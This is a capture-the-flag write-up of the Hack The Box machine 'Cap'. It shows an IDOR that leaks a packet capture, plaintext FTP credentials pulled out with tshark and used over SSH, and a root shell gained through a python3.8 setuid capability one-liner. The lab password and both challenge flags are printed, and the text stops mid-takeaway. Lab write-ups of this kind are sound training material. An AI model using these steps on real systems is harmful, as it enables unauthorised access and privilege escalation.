Welcome, everyone. Today I’ll walk you through the HTB machine **Cap**, an Easy‑rated box that demonstrates how a simple IDOR can leak credentials and how a mis‑configured Linux capability can give you root. Let’s dive in.

**Reconnaissance**  
I started with a standard service and version scan:  

```
nmap -sC -sV 10.129.19.233
```  

The scan returned three open ports:  

- **21/tcp** – vsftpd 3.0.3  
- **22/tcp** – OpenSSH 8.2p1 on Ubuntu 4ubuntu0.2  
- **80/tcp** – Gunicorn serving a web app called “Security Dashboard”

Anonymous FTP login was tested and failed, so I turned my attention to the web interface. The dashboard had three notable endpoints: `/capture`, `/ip`, and `/netstat`. Visiting `/capture` always issued a 302 redirect to `/data/1`. Curious about the numeric ID, I manually requested `/data/0` and discovered a download button pointing to `/download/0`. This indicated an Insecure Direct Object Reference (IDOR) – the application was serving files based on a predictable numeric identifier without proper authorization checks.

**Exploitation – stealing FTP credentials**  
I fetched the PCAP file with curl and saved it locally:

```
curl -s http://10.129.19.233/download/0 -o capture.pcap
```

Next, I inspected the capture for FTP traffic using tshark:

```
tshark -r capture.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg
```

The output revealed plaintext credentials:

```
USER    nathan
PASS    Buck3tH4TF0RM3!
```

With those credentials in hand, I attempted an SSH login as the user *nathan*:

```
ssh nathan@10.129.19.233
```
Password: **Buck3tH4TF0RM3!**

The connection succeeded, giving me a user shell and the user flag: `2874475212d535da1ca01f207b3a6939`.

**Privilege Escalation – abusing Linux capabilities**  
Once inside, I performed a quick enumeration for binaries with granted capabilities:

```
getcap -r / 2>/dev/null
```

The result showed:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

The `cap_setuid` capability allows a process to change its own UID arbitrarily, including to zero (root). I leveraged this with a one‑liner Python payload:

```
python3.8 -c 'import os; os.setuid(0); os.system("bash")'
```

Running it spawned a root shell, confirming the escalation with `uid=0(root)`. From there I grabbed the root flag: `006b90cfdd1f951eb31fe3278eb85847`.

**Key takeaway for security professionals**  
This box highlights two often‑overlooked risks. First, sequential numeric IDs in URLs are a classic IDOR vector – always test low values like 0, 1, 2 when you see patterns such as `/data/<id>` or `/download/<id>`.
